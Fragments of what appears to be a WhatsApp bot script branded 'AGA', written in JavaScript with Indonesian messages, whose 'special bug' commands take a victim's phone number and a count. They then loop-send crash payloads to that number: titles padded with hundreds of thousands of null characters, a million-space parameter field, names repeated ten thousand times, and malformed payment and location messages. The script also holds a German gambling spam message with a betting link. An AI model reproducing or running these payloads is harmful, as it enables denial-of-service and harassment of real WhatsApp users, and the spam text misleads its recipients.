...
const responbug = 'tunggu proses ny selesai jangan spam nanti kenon'
...
{
"name": "review_and_pay",
"buttonParamsJson": `{\"currency\":\"IDR\",\"total_amount\":{\"value\":49981399788,\"offset\":100},\"reference_id\":\"4OON4PX3FFJ\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"subtotal\":{\"value\":49069994400,\"offset\":100},\"tax\":{\"value\":490699944,\"offset\":100},\"discount\":{\"value\":485792999999,\"offset\":100},\"shipping\":{\"value\":48999999900,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"7842674605763435\",\"product_id\":\"7842674605763435\",\"name\":\"AgaBotz ✅",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":7},{\"retailer_id\":\"custom-item-f22115f9-478a-487e-92c1-8e7b4bf16de8\",\"name\":\"\",\"amount\":{\"value\":999999900,\"offset\":100},\"quantity\":49}]},\"native_payment_methods\":[]}`
}
]
}
}
 ...
 var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
    interactiveMessage: {
      header: {
        title: "RxhlCrash",
        hasMediaAttachment: true,
        ...(await prepareWAMessageMedia({ image: { url: "https://telegra.ph/file/2bd9345f9efe3f4d7466e.jpg" } }, { upload: rxhl.waUploadToServer }))
      },
      body: {
        text: ""
      },
...
async function sendListMessage(jid) {
  var messageContent = generateWAMessageFromContent(jid, proto.Message.fromObject({
    'listMessage': {
      'title': "AGA VIP 💖 WHATSAPP" + "\0".repeat(920000),
      ...
      'message': {
        'interactiveMessage': {
          ...
          'nativeFlowMessage': {
            'buttons': [{
              'name': 'cta_url',
              'buttonParamsJson': "{ display_text : 'AGA VIP 💖 WHATSAPP', url : , merchant_url :  }"
            }],
  ...
  "interactiveMessage": {
    ...
    "nativeFlowMessage": {
      "buttons": [
        {
          "name": "cta_url",
          "buttonParamsJson": "{ display_text : 'AgaBugWhatsApp', url : , merchant_url :  }"
        }
      ],
      "messageParamsJson": " ".repeat(1000000)
    }
...
const replyy = (teks) => {
return rxhl.sendMessage(from, { text: teks, contextInfo:{"externalAdReply": {"title": `AGA DEVELOPER 🌛`,"body": `Hai ${pushname}`, "previewType": "PHOTO","thumbnail": rxhlimage,"sourceUrl": `https://youtube.com/@aga`}}}, { quoted:m})} 
...
"mediaType": 1, 
"thumbnail": rxhlimage, 
"mediaUrl": "https://telegra.ph/file/2bd9345f9efe3f4d7466e.jpg", 
"sourceUrl": "https://whatsapp.com/channel/0029VaRygQcATRSk29RI4P1x" }}}, { quoted: m }) }
...
hohe = [
  {
                'name': 'single_select',
                'buttonParamsJson': "{'title':'AGA BOT','sections':[{'title':'Pilihan Premium!','highlight_label':'Berbayar','rows':[{'header':'','title':'VVIP AGA BOT ','description':'Telegram: @agabotz','id':'.kontplbinatang'}]}]}"
              },
              {
   name: "cta_url",
   buttonParamsJson: JSON.stringify({
      display_text: "My Channel",
      url: "https://youtube.com/@cyawwww?si=mego51_51",
      merchant_url: "https://youtube.com/@cyawwww?si=mego51_51"
   })
}
]
ewe = `▭▬▭▬▭▬▭▬▭▬▭▬▭▬
...
▭▬▭▬▭▬▭▬▭▬▭▬▭▬
      *𝗦𝗣𝗘𝗖𝗜𝗔𝗟 𝗕𝗨𝗚*
•. ${prefix}agabug *628xxx|Amount*
•. ${prefix}agakeren *628xxx|Amount*
•. ${prefix}agakawai *628xxx|Amount*
•. ${prefix}agaios *628xxx|Amount*
•. ${prefix}agaandro *628xxx|Amount*
▭▬▭▬▭▬▭▬▭▬▭▬▭▬
      *𝗢𝗧𝗛𝗘𝗥 𝗠𝗘𝗡𝗨*
...
hohe = [
  {
                'name': 'single_select',
                'buttonParamsJson': "{'title':'AGA BOT','sections':[{'title':'Pilihan Premium!','highlight_label':'Berbayar','rows':[{'header':'','title':'VVIP AGA BOT ','description':'Telegram: @agabotzz','id':'.kontplbinatang'}]}]}"
              },
              {
   name: "cta_url",
   buttonParamsJson: JSON.stringify({
...
hohe = [
  {
                'name': 'single_select',
                'buttonParamsJson': "{'title':'AGA BOT','sections':[{'title':'Pilihan Premium!','highlight_label':'Berbayar','rows':[{'header':'','title':'VVIP AGA BOT ','description':'Telegram: @AGA','id':'.kontplbinatang'}]}]}"
              },
              {
   name: "cta_url",
   buttonParamsJson: JSON.stringify({
...
await loading()
 rxhlganteng = await getBuffer(`https://github.com/DGXeon/Tiktokusic-API/raw/master/tiktokmusic/${command}.mp3`)
...
mediaType:  1,
mediaUrl: 'https://wa.me/201025663589',
title: `AGA VIP 💖`,
sourceUrl: `https://wa.me/201025663589`, 
thumbnail: rxhlimage
}
}})
break
...
*SCRIPT DEVELOPER BY AGA OFFICIAL*`
}
...
Hallo, ich komme von einem Online-Glücksspielseitenunternehmen namens AGA999. Ich bin hier, um Ihnen anzubieten, Ihr Geld sofort zu verdoppeln. Sie können es verdoppeln, indem Sie auf der Wettseite AGA9999
einen Nominalwert von 80 $ und einen Preis von 900 $ einzahlen. Bitte registrieren Sie sich über den Link 👇 auf der Online-Glücksspielseite AGA9999
🎮 Wettseiten: https://register.AGA999.bet/
...
if (!q) return replyz('masukkan nomor target nya kak 💖')
Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : qtext.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
await rxhl.sendMessage(Pe, { text: 'RxhL Reaction??', contextInfo:{ isForwarded: true, forwardedNewsletterMessageInfo: { newsletterJid: '120363230213252726@newsletter', newsletterName: `RxhlReaction`.repeat(10000), serverMessageId: 2 } }}, { quoted: xbug2 })
await sleep(2000)
...
for (let i = 0; i < amount; i++) {
rxhl.sendMessage(Pe, { "caption": `AGA Official `, audio: rxhlganteng, mimetype: 'audio/mpeg', ptt:false,"title":`p`,"contextInfo": {"forwardingScore": 99999999,"isForwarded": true,forwardedNewsletterMessageInfo: { newsletterJid: '120363230213252726@newsletter', newsletterName: `AGABotz`.repeat(10000),serverMessageId: 2 }}},{quoted: xbug2 })
await sleep(1500)
}
...
for (let i = 0; i < amount; i++) {
rxhl.sendMessage(Pe, { location: { degreesLatitude: 173.282, degreesLongitude: -19.378, name: `AGABotz`, address: `1.1.1.1.11`, url: `https://${XeonOP}.com`, comment: `BUG LOCATION`, jpegThumbnail: null, "contextInfo": {"forwardingScore": 99999999,"isForwarded": true,forwardedNewsletterMessageInfo: { newsletterJid: '120363230213252726@newsletter', newsletterName: `AGABotz`.repeat(10000),serverMessageId: 2 }}} }, { quoted: xbug2 })
await sleep(1500)
}
replyz(`*</> Succes 🥰*`)
}
...
await sleep(500)
rxhl.sendMessage(Pe, { text: 'RxhL Reaction??', contextInfo:{ isForwarded: true, forwardedNewsletterMessageInfo: { newsletterJid: '120363230213252726@newsletter', newsletterName: `AgalReaction`.repeat(10000), serverMessageId: 2 } }}, { quoted: xbug2 })
await sleep(500)
await rxhl.relayMessage(Pe, {"paymentInviteMessage": {serviceType: "FBPAY",expiryTimestamp: Date.now() + 1814400000}},{})
await sleep(500)
rxhl.sendMessage(Pe, { "caption": `Aga Official `, audio: rxhlganteng, mimetype: 'audio/mpeg', ptt:false,"title":`p`,"contextInfo": {"forwardingScore": 99999999,"isForwarded": true,forwardedNewsletterMessageInfo: { newsletterJid: '120363230213252726@newsletter', newsletterName: `AgaBotz`.repeat(10000),serverMessageId: 2 }}},{quoted: xbug2 })
...
case 'agabug': case 'agakeren': case 'agakawai': case 'agaios': case 'agaandro':
if (!isMurbug) return replyz(global.nocreator)
if (!q) return replyz(`Example:\n ${prefix + command} 62xxxx|5`)
victim = qtext.split("|")[0]
amount = qtext.split("|")[1]
